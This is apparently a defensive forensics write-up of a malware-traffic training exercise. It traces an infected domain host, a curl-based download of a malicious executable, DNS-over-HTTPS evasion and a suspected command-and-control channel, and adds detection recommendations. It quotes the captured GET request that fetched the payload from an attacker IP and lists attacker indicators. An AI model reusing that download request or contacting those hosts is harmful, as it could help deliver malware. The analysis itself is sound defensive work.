# Network Forensics Report: Malware Traffic Analysis — "Natureforce" Exercise

**Analyst:** Taufiq
**Date:** 2026-10-24
**Source:** [malware-traffic-analysis.net](https://malware-traffic-analysis.net/training-exercises.html), 2026-10-01 exercise ("Natureforce")
**Classification:** Internal / Portfolio
**Tools used:** Wireshark 4.6.9

---

## 1. Objective

Given only a raw packet capture (no SIEM, no endpoint telemetry, no prior alert), reconstruct what happened on an infected host: identify the victim, trace the payload delivery, and determine what the malware did immediately after execution. This exercise builds the network-forensics skillset that complements the host-based detection work from Phase 1 — here there is no agent and no dashboard, only the wire.

---

## 2. Scope

| Item | Detail |
|---|---|
| Capture | `2026-10-01-traffic-analysis-exercise.pcap` |
| Total packets | 42,497 |
| Analysis environment | Standalone Wireshark analysis on analyst workstation (no lab VM involved — static file analysis) |

---

## 3. Host Identification

Using DHCP, LLMNR, and Kerberos traffic, the infected host was fully identified without any host-based tooling:

| Attribute | Value | Source |
|---|---|---|
| IP address | `10.10.1.128` | DHCP ACK (frame 4) |
| Hostname | `DESKTOP-4VGYQX7` | LLMNR query, frame 5 |
| MAC address | `00:22:fb:ec:7e:e7` | Ethernet source, DHCP exchange |
| AD domain | `NATUREFORCE.COM` | Kerberos realm field |
| Logged-on user | `bdiaz` | Kerberos AS-REQ cname (frame 170) |

**Note on user identification:** the host's own machine account (`desktop-4vgyqx7$`) also appears in Kerberos traffic (frame 93) performing its own background TGT request — this is normal AD behavior and is *not* the user account. The actual interactive user was found in a separate, later AS-REQ (frame 170) whose `cname-string` has no trailing `$`.

![Kerberos AS-REQ showing the logged-on user bdiaz](phase2-phase2-screenshots/04-kerberos-user-bdiaz.png)
*Figure 1: Kerberos AS-REQ (frame 170), `cname-string: bdiaz` — confirmed as a human user account, distinct from the machine's own `desktop-4vgyqx7$` account seen earlier in the capture.*

---

## 4. Payload Delivery

**Statistics → Protocol Hierarchy** was run first to get an overview of the capture before targeted analysis:

![Protocol hierarchy overview](phase2-phase2-screenshots/01-protocol-hierarchy.png)
*Figure 2: Protocol breakdown — notable AD/domain traffic (Kerberos, LDAP, SMB2, DCE/RPC) consistent with a domain-joined host, plus a small amount of HTTP.*

**File → Export Objects → HTTP** surfaced one clearly anomalous transfer among otherwise benign connectivity-check/certificate traffic:

![HTTP object export list](phase2-phase2-screenshots/02-http-export-objects.png)
*Figure 3: Export Objects list — `runner_ilove.exe` (1,646,592 bytes, `binary/octet-stream`) delivered from `107.175.82.242:9000`, the only entry served from a bare IP on a non-standard port rather than a named domain on 80/443.*

| Detail | Value |
|---|---|
| Server | `107.175.82.242:9000` |
| Full path | `/wilow/runner_ilove.exe` |
| File size | 1,646,592 bytes (~1.6 MB) |
| Content-Type | `binary/octet-stream` |
| Server software | `MinIO` (self-hosted S3-compatible object storage — not a mainstream CDN) |
| SHA-256 | **Not captured** — see Section 6, Gaps |

Following the HTTP stream for this request (frame 23091) revealed the request header:

```
GET /wilow/runner_ilove.exe HTTP/1.1
Host: 107.175.82.242:9000
User-Agent: curl/8.21.0
Accept: */*
```

![GET request for the payload, no preceding delivery chain visible](phase2-phase2-screenshots/03-curl-get-request.png)
*Figure 4: The GET request (frame 23091) appears immediately after a bare TCP SYN (frame 23088) — no HTTP redirect chain, no landing page, and nothing in cleartext precedes it.*

**Analysis:** the `User-Agent: curl/8.21.0` is the key detail — this was **not a user clicking a download link in a browser**. A browser would present a Chrome/Edge/Firefox UA string. `curl` making the request means something already executing on the host — a script, a dropper, or a first-stage loader — silently pulled this second-stage payload.

Checking the traffic immediately preceding the download (TLS Client Hello SNI inspection on the two prior sessions) showed only legitimate Microsoft traffic:
- `vsblobprodscussu5shard51.blob.core.windows.net` (Azure Blob Storage)
- `msdl.microsoft.com` (Windows Symbol Server)

Neither is related to the infection. **The actual initial-access/delivery mechanism (e.g. phishing email, malicious link, exploit) is not observable in this capture** — the file begins mid-session, after the host was already compromised. This is a scope limitation of the capture, not a dead end, and is stated plainly rather than guessed at.

---

## 5. Post-Infection Activity

Traffic immediately following the payload download showed a clear two-step pattern:

**Step 1 — DNS-over-HTTPS (DoH) to evade DNS visibility.** At frame 24922, the host queries the internal DC for `dns.google`, then immediately opens an encrypted TLS session directly to `8.8.4.4` (Google Public DNS) with SNI `dns.google`:

![DNS-over-HTTPS session beginning immediately after payload download](phase2-phase2-screenshots/05-doh-query.png)
*Figure 5: TLS Client Hello to 8.8.4.4, SNI=dns.google — DNS resolution performed over an encrypted channel straight to a public resolver, bypassing the internal DNS server that a SOC would normally have visibility into.*

**Step 2 — Connection to a new, unseen IP.** Immediately after the DoH exchange completes, the host opens a connection to `195.63.128.106:443` — an IP that appears nowhere else in the capture:

![New connection to 195.63.128.106 following the DoH lookup](phase2-phase2-screenshots/06-suspected-c2.png)
*Figure 6: Connection to 195.63.128.106:443. Wireshark's heuristic dissector labels this SSLv2/Encrypted Data, but there is no visible Client Hello, Server Hello, or certificate exchange beforehand — real TLS does not skip its handshake. This strongly suggests a custom/proprietary encrypted protocol disguised on port 443 rather than genuine HTTPS.*

**Analysis:** this is a textbook evasion pattern — resolve the C2 domain via DoH (so internal DNS logs show nothing useful), then connect over what looks like HTTPS but isn't really standard TLS (so basic port/protocol-based monitoring sees "normal" 443 traffic). `195.63.128.106:443` is assessed as the likely command-and-control channel. Confirming this with certainty (true beacon interval, protocol fingerprinting via JA3/JA4) was identified as a next step but not completed in this pass — see Recommendations.

---

## 6. Findings / Gaps

**Finding — full chain reconstructed from network evidence alone:** host identity, payload delivery, and a strong C2 candidate were all established without any endpoint telemetry, demonstrating that meaningful investigation is possible from packet capture alone when no SIEM/EDR coverage exists.

**Gap — SHA-256 hash not obtained.** When the exported `runner_ilove.exe` was saved to the analyst's workstation, Windows Defender's real-time protection silently deleted it before it could be hashed — correct behavior for the endpoint, but it meant the file could not be hashed on that machine. The correct process (not completed in this pass) is to extract and hash live malware samples inside an isolated, network-contained analysis VM rather than a daily-use workstation, precisely so AV deletion/execution risk doesn't apply.

**Gap — initial access vector not observed.** The capture begins after the host is already compromised; the delivery mechanism for whatever ran `curl` is outside the captured window.

**Gap — C2 not fully confirmed.** `195.63.128.106:443` is assessed as the likely C2 channel based on its non-standard pseudo-TLS pattern and timing (immediately post-DoH), but ongoing beacon behavior across the rest of the capture was not verified in this pass.

---

## 7. MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|---|---|---|
| Ingress Tool Transfer | T1105 | `curl` download of `runner_ilove.exe` from attacker-controlled storage |
| Non-Standard Port | T1571 | Payload served on port 9000 rather than 80/443 |
| Application Layer Protocol: DNS | T1071.004 | DNS-over-HTTPS used to resolve a domain outside normal DNS visibility |
| Encrypted Channel | T1573 | Non-standard/pseudo-TLS session to suspected C2 on port 443 |

---

## 8. Recommendations / Next Steps

1. **Extract and hash samples in an isolated VM**, never on a production/daily-use endpoint — repeat the hash extraction for `runner_ilove.exe` in a sandboxed, network-contained VM and check the result against VirusTotal.
2. **Monitor/alert on DoH to public resolvers** (8.8.8.8, 8.8.4.4, 1.1.1.1, etc.) from internal hosts — in a managed environment this traffic should be blocked or routed through an inspectable internal DoH proxy, since it otherwise blinds DNS-based detection entirely.
3. **Flag downloads of executables over non-standard ports** (T1571) as a detection rule — legitimate software distribution rarely uses raw IP:port combinations like `:9000`.
4. **Add JA3/JA4 TLS fingerprinting** to distinguish genuine TLS sessions from malware using port 443 without a real TLS handshake, which would have flagged the suspected C2 channel immediately.
5. **Confirm beaconing** by reviewing the full capture for repeated connections to `195.63.128.106` at regular intervals, to move this from "likely C2" to "confirmed C2."
6. **Widen the capture window** in future incidents — had logging started earlier, the actual initial-access vector would likely be visible.

---

## Appendix: IOC Summary

| Indicator | Value |
|---|---|
| Infected host IP | 10.10.1.128 |
| Infected hostname | DESKTOP-4VGYQX7 |
| Infected host MAC | 00:22:fb:ec:7e:e7 |
| Compromised user | bdiaz |
| Payload delivery host | 107.175.82.242:9000 |
| Payload path | /wilow/runner_ilove.exe |
| Payload filename | runner_ilove.exe |
| Payload size | 1,646,592 bytes |
| Payload SHA-256 | Not captured (see Section 6) |
| Suspected C2 IP | 195.63.128.106:443 |
| DoH resolver used for evasion | 8.8.4.4 (dns.google) |
